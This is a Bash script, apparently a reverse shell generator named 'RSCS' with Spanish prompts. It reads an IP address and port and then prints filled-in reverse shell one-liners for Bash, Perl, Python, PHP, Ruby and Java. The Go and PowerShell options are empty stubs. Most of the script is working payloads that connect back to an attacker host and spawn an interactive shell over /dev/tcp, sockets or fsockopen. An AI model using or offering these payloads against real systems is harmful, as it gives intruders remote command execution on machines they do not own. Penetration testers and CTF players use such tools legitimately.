#!/usr/bin/env bash

# Made by Nicolas Morales Aka - Harrizzon

export DEBIAN_FRONTEND=noninteractive

# Colors

green="\e[0;32m\033[1m"
end="\033[0m\e[0m"
red="\e[0;31m\033[1m"
blue="\e[0;34m\033[1m"
yellow="\e[0;33m\033[1m"
purple="\e[0;35m\033[1m"
turquois="\e[0;36m\033[1m"
gray="\e[0;37m\033[1m"
bold="\e[1m"




# SALIR
trap ctrl_c INT

function ctrl_c(){
    clear
    echo -e "\n${red}${bold}[!]${end}${yellow}Saliendo...${end}${red}${bold}[!]${end}";sleep 0.2
    echo -e "${white}Gracias por utilizar ${cyan}${bold}RSCS"
    2>/dev/null
    exit 0

}

function banner(){
    echo -e "${turquois}
                ____  _____ ___________      
               / __ \/ ___// ____/ ___/            
         >    / /_/ /\__ \/ /    \__ \   <        
         >   / _, _/___/ / /___ ___/ /   < 
            /_/ |_|/____/\____//____/    
    "${end}
    echo -e "\t   ${red}>${end}${purple} By: ${end}${yellow}Harrizzon${end}${red} ! <${end}\n"
}



# MAIN
function menu(){
    
    
    echo -e "\n${green} [>] Iniciando... [<]${end}";sleep 1;
    clear
    opt=0
    
    while [ $opt = 0 ]
    do
        banner
        echo -e "${turquois}1)${end}${yellow} Bash reverse shells${end}"
        echo -e "${turquois}2)${end}${yellow} Perl reverse shells${end}"
        echo -e "${turquois}3)${end}${yellow} Python reverse shells${end}"
        echo -e "${turquois}4)${end}${yellow} PHP reverse shells${end}"
        echo -e "${turquois}5)${end}${yellow} RUBY reverse shells${end}"
        echo -e "${turquois}6)${end}${yellow} JAVA reverse shells${end}"
        echo -e "${turquois}7)${end}${yellow} GO reverse shells${end}"
        echo -e "${turquois}8)${end}${yellow} Powershell reverse shells${end}"
        read opc
        case $opc in
            1) bashm; opt=1;;
            2) perlm; opt=1;;
            3) pym; opt=1;;
            4) phpm; opt=1;;
            5) rubym; opt=1;;
            6) javam; opt=1;;
            7) gom; opt=1;;
            8) powerm; opt=1;;
            *) echo -e "${red}[!]${end} Seleccione una opcion valida ${red}[!]${end}";sleep 1.2; clear
        esac

    done
    
}

function bashm(){
    clear
    echo -e "${yellow}1 » ${end}${green}bash -i >& /dev/tcp/${red}$aipi${end}${green}/${end}${red}$portk${end}${green} 0>&1${end}"

}

function perlm(){
    clear
    echo -e "${yellow}1 » ${end}${green}perl -e 'use Socket;"'$i'"""=""\"${red}$aipi${end}${green}\""";"'$p'"=${end}${red}$portk${end}${green};socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in("'$p'",inet_aton("'$i'")))){open(STDIN,"'>&S'");open(STDOUT,"'>&S'");open(STDERR,"'>&S'");exec("'/bin/sh -i'");};'${end}"


}

function pym(){
    clear
    echo -e "${yellow}1 » ${end}${green}python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"${red}$aipi${end}${green}\",${end}${red}$portk${end}${green}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\""/bin/sh\"""",\"-i\"]);'${end}\n"
    echo -e "${yellow}2 » ${end}${green}python -c 'import pty;import socket,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"${red}$aipi${end}${green}\",${red}$portk${end}${green}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'${end}"
}

function phpm(){
    clear
    declare sock='$sock'
    echo -e "${yellow}1 » ${end}${green}php -r "\'$sock"\=fsockopen(\"${red}$aipi${end}${green}\",${end}${red}$portk${end}${green});exec(\"/bin/sh -i <&3 >&3 2>&3\");'${end}\n"
    echo -e "${yellow}2 » ${end}${green}<?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/${red}$aipi${end}${green}/${end}${red}$portk${end}${green} 0>&1'\");?>${end}"
    
}

function rubym(){
    clear
    echo -e "${yellow}1 » ${end}${green}ruby -rsocket -e'f=TCPSocket.open(\"${red}$aipi${end}${green}\",${end}${red}$portt${end}${green}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'${end}"

}

function javam(){
    clear
    declare line='\$line'
    echo -e "${yellow}1 » ${end}${green}\tr = Runtime.getRuntime()${end}"
    echo -e "\t${green}p = r.exec([\"/bin/sh\",\"-c\",\"exec 5<>/dev/tcp/${red}$aipi${end}${green}/${red}$portk${end}${green};cat <&5 | while read line; do $line 2>&5 >&5; done\"] as String[])${end}"
    echo -e "\t${green}p.waitFor()${end}"
}

function gom(){
    clear
}

function powerm(){
    clear
    
}

# FLUJO
clear
declare aipi
declare portk
echo -e "${red}[>] Ingresa tu IP${end}${green}"
read ipe
echo -e "${end}${red}[>] Ingresa un puerto${end}${green}"
read portt
aipi=$ipe
portk=$portt

menu